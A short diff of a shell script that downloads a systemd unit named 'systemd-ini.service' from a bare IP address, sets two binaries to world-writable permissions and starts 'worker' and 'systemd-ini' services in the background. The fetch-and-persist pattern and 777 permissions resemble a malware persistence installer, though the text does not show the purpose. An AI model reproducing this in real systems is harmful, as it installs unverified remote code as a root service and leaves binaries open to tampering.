@@ -11,10 +11,12 @@ wget 10.10.1.34/Services/systemd-ini.service -O /etc/systemd/system/systemd-ini.
 chmod 777 /usr/bin/start
 chmod 777 /usr/bin/sys
 
-sleep 5
-systemctl enable worker
-systemctl start worker
+# Start services
 
+systemctl enable worker
 sleep 5
+systemctl start worker &
+
 systemctl enable systemd-ini
-systemctl start systemd-ini
+sleep 5
+systemctl start systemd-ini &
